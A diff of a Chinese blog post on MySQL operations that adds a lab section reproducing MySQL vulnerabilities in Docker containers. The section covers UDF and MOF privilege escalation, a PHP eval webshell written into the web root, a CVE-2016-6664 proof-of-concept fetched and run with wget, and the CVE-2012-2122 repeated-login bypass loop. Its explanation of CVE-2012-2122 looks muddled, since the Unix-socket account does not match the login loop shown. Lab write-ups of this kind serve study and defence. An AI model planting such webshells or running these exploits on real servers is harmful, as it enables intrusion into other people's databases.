@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://one-null-pointer.github.io/img/Linux.png">
 <meta property="article:published_time" content="2023-06-04T08:29:07.000Z">
-<meta property="article:modified_time" content="2023-08-13T07:49:15.721Z">
+<meta property="article:modified_time" content="2023-08-13T09:56:37.378Z">
 <meta property="article:author" content="liaoyue">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://one-null-pointer.github.io/img/Linux.png">
@@ -208,7 +208,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          12k words
+          15k words
         
       </span>
     
@@ -219,7 +219,7 @@
         
         
         
-          97 mins
+          128 mins
         
       </span>
     
@@ -729,6 +729,129 @@
 <p>&emsp;&emsp;配置慢查询日志：在my.cnf文件中添加以下参数：</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">slow_query_log</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">slow_query_log_file</span>=/var/log/mysql/slow-query.log<br><span class="hljs-attr">long_query_time</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
 
+<p>&emsp;</p>
+<h4 id="6-漏洞复现举例"><a href="#6-漏洞复现举例" class="headerlink" title="6.漏洞复现举例"></a>6.漏洞复现举例</h4><ul>
+<li><h5 id="mysql用户提权知识"><a href="#mysql用户提权知识" class="headerlink" title="mysql用户提权知识"></a>mysql用户提权知识</h5></li>
+</ul>
+<p>&emsp;&emsp;前面复刻了几个redis的漏洞问题，现在开始着手mysql的漏洞搭建，mysql的现成搭建漏洞环境比较少，使用的工具有比较多，这里就暂且挑选两个漏洞进行复刻的尝试，首先了解一下mysql的漏洞问题，对于这列中间件，最重要的摸过与提权问题，而MySQL中， UDF 提权、MOF 提权也算是耳熟能详，这些提权的前提条件都是拿到高权限的mysql用户，也就是说mysql的提权来讲，我们首先说起到高权限的mysql用户，之后再进行系统的一个提权操作，这是一般的思路。获取用户账户密码的也无非就是这几种方式：</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">端口弱口令爆破<br>--sql-shell 模式<br>网站的数据库配置文件中拿到明文密码信息<br>CVE<span class="hljs-string">-2012</span><span class="hljs-string">-2122</span> 等这类漏洞直接拿下 MySQL 权限<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><h5 id="高权限用户下的系统提权方法"><a href="#高权限用户下的系统提权方法" class="headerlink" title="高权限用户下的系统提权方法"></a>高权限用户下的系统提权方法</h5></li>
+</ul>
+<p>&emsp;&emsp;前面提到了UDF 提权、MOF 提权这里进行解释，辅导一些提权过程的截图（查找来的资料）</p>
+<p>&emsp;&emsp;在MySQL中，UDF提权是指通过利用用户定义函数的漏洞来获取更高权限的过程。当存在UDF的安全漏洞时，攻击者可以通过构造恶意的UDF来执行任意代码，并以数据库系统的特权身份运行该代码，从而获得比其正常权限更高的访问权限</p>
+<center><img src="/img/Linux运维——Mysql（二）/63.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;MOF提权是指通过利用Windows管理对象格式文件的漏洞来获取更高权限的过程。MOF文件是一种用于描述和定义Windows管理对象的文件格式。当存在MOF文件的安全漏洞时，攻击者可以通过构造恶意的MOF文件来执行任意代码，并以系统级别权限运行该代码，从而获得比其正常权限更高的访问权限</p>
+<center><img src="/img/Linux运维——Mysql（二）/64.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;启动项提权是指通过修改系统启动项的方式来获取更高权限的过程。启动项是在计算机启动时自动运行的程序或脚本。攻击者可以通过修改启动项，将恶意程序或脚本添加到系统启动流程中，并以系统级别权限运行该恶意代码，从而获得比其正常权限更高的访问权限</p>
+<center><img src="/img/Linux运维——Mysql（二）/65.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="安装docker环境"><a href="#安装docker环境" class="headerlink" title="安装docker环境"></a>安装docker环境</h5></li>
+</ul>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> docker<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Mysql（二）/66.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;安装完成后，启动Docker服务并将其设置为开机自启动。使用以下命令：</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sudo <span class="hljs-params">system</span>ctl start docker<br>sudo <span class="hljs-params">system</span>ctl enable docker<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Mysql（二）/67.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;安装docker </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">83</span>:<span class="hljs-number">80</span> -p <span class="hljs-number">3366</span>:<span class="hljs-number">3306</span> -p <span class="hljs-number">9999</span>:<span class="hljs-number">9999</span> --name MySQLprivileges tutum/lamp:latest<br></code></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;-d 参数表示以后台模式运行容器。-p 83:80 表示将主机的83端口映射到容器的80端口，这样你可以通过访问主机的83端口来访问容器中运行的Web服务器。-p 3366:3306 表示将主机的3366端口映射到容器的3306端口，这样你可以通过访问主机的3366端口来访问容器中运行的MySQL数据库。-p 9999:9999 表示将主机的9999端口映射到容器的9999端口，这可能是用于反弹连接或其他特定用途。最后，–name MySQLprivileges 指定了容器的名称为MySQLprivileges，而tutum/lamp:latest 是使用的Docker镜像</p>
+<center><img src="/img/Linux运维——Mysql（二）/68.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker ps <span class="hljs-comment">#查看container_id</span><br>docker exec -it <span class="hljs-number">6</span>d62681aa477 <span class="hljs-regexp">/bin/</span>bash<br>apt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Mysql（二）/69.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;注意这里的6d62681aa477需要使用docker ps指令进行相关查看，6d62681aa477是一个示例容器ID，需要将其替换为要进入的实际容器的ID。一旦进入了容器的bash shell，你可以在其中运行各种命令，就像在本地计算机上一样。可以使用这个shell来查看和修改容器内部的文件、安装软件包、运行脚本等等。当完成操作后，可以使用exit命令退出容器的bash shell，并返回到主机的命令行界面</p>
+<p>&emsp;&emsp;apt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev这个命令是在容器的bash shell中使用apt包管理器来更新软件包列表，并安装了wget、gcc和libmysqlclient-dev软件包，这是为后面的mysql环境做准备</p>
+<p>&emsp;&emsp;接下来是webshell的写入：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[r0n1n]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; &gt;  /var/www/html/shell.php</span><br><span class="language-xml">chmod -R 777 var/www/html</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Mysql（二）/70.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h5></li>
+</ul>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> testdb;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;123456&#x27;</span>; <br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">create</span>,<span class="hljs-keyword">drop</span>,<span class="hljs-keyword">insert</span>,<span class="hljs-keyword">select</span> <span class="hljs-keyword">on</span> testdb.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;test&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Mysql（二）/71.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="CVE-2016-6664模拟入侵"><a href="#CVE-2016-6664模拟入侵" class="headerlink" title="CVE-2016-6664模拟入侵"></a>CVE-2016-6664模拟入侵</h5></li>
+</ul>
+<p>&emsp;&emsp;目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式，tutum/lamp日志方式为syslog，需要修改</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vi</span> etc/mysql/<span class="hljs-keyword">conf</span>.d/mysqld_safe_syslog.<span class="hljs-keyword">cnf</span><br></code></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;别问，问就是这个环境没有vim，vim用习惯了</p>
+<center><img src="/img/Linux运维——Mysql（二）/72.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;</p>
+<center><img src="/img/Linux运维——Mysql（二）/73.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;重启mysql：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mysqld_safe <span class="hljs-attribute">--user</span>=mysql<br>grep -r syslog etc/mysql<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Mysql（二）/74.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;使用grep指令鉴别对应的mysql，没有返回任何结果即满足所谓的”基于问价日志”要求，接下来就是上传mysql-chowned.sh，代码网上也有，这里就不过多展示了（代码太长了），这里需要注意的是必须以mysql权限执行才能成功提为root，可以利用CVE-2016-6663提升为mysql权限的shell执行如下指令</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/firebroo/</span>CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">6663</span><span class="hljs-regexp">/blob/m</span>aster/poc.sh<br>chmod <span class="hljs-number">777</span> poc.sh<br>.<span class="hljs-regexp">/poc.sh /</span>var<span class="hljs-regexp">/log/my</span>sql/error.log<br></code></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;最后就是，获得root的相关权限了，由于这里没有才菜刀，所以都说跳过了6663的漏洞模拟，没想到在这里等着我，可恶啊，最终达到的效果大致是如下：</p>
+<center><img src="/img/Linux运维——Mysql（二）/75.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<ul>
+<li><h5 id="CVE-2012-2122模拟入侵"><a href="#CVE-2012-2122模拟入侵" class="headerlink" title="CVE-2012-2122模拟入侵"></a>CVE-2012-2122模拟入侵</h5></li>
+</ul>
+<p>&emsp;&emsp;同样道理，使用docker查看对应的容器, 这里使用了Vulhub 中的 mysql/CVE-2012-2122 模块，在 vulhub/mysql/CVE-2012-2122 目录下使用 docker-compose up -d 命令启动容器：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> vulhub/mysql/CVE-<span class="hljs-number">2012</span>-<span class="hljs-number">2122</span><br><span class="hljs-attribute">docker</span>-compose up -d<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Mysql（二）/76.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;执行容器：</p>
+<center><img src="/img/Linux运维——Mysql（二）/77.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;这里提示了我们，有其他进程正在使用端口3306，这是由于我之前就按照了5.7版本的mysql没有关闭，因此，需要stop掉，用netstat -tuln | grep 3306或者ps aux | grep mysql进行检验：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">systemctl <span class="hljs-keyword">stop</span> mysql<br><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> mysql<br>netstat -tuln | <span class="hljs-keyword">grep</span> <span class="hljs-number">3306</span><br>docker-compose <span class="hljs-keyword">up</span> -d<br></code></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;检验是否启动常用，测试数据库即可</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysql</span> -h <span class="hljs-number">192.168.70.180</span> -uroot -p123456<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Mysql（二）/78.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;连接正常，说明没有问题，接下来进行5.5版本的漏洞利用</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in `seq <span class="hljs-number">1</span> <span class="hljs-number">1000</span>`; do mysql -uroot -pwrong -h <span class="hljs-number">192.168.70.180</span> -P3306 ; done<br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/Linux运维——Mysql（二）/79.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;尽管我们的密码是错误的，也在多次连接失败后成功进入到数据库中</p>
+<p>&emsp;&emsp;CVE-2012-2122是一个影响MySQL数据库的身份认证绕过漏洞，也被称为”MySQL Authentication Bypass”漏洞。该漏洞的利用原理如下：在MySQL中，用户可以选择使用密码进行身份验证，也可以选择使用无密码身份验证。当用户选择无密码身份验证时，MySQL会尝试通过Unix套接字（socket）连接进行身份验证。由于一个错误的实现，MySQL在处理Unix套接字连接时存在漏洞。攻击者可以通过发送特制的请求来利用这个漏洞。攻击者可以通过向MySQL服务器发送恶意请求，使其在进行身份验证时跳过密码验证步骤，从而绕过密码验证并获得对数据库的访问权限。</p>
+<p>&emsp;&emsp;具体来说，攻击者可以通过在Unix套接字连接上发送一个空的或包含空字符的用户名，然后在密码字段中输入任意值，从而欺骗MySQL服务器绕过密码验证。</p>
 
                 
               </div>
@@ -810,9 +933,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/06/07/Linux%E8%BF%90%E7%BB%B4%E2%80%94%E2%80%94PHP/" title="PHP">
+                      <a href="/2023/06/05/Linux%E8%BF%90%E7%BB%B4%E2%80%94%E2%80%94Redis/" title="Redis">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PHP</span>
+                        <span class="hidden-mobile">Redis</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
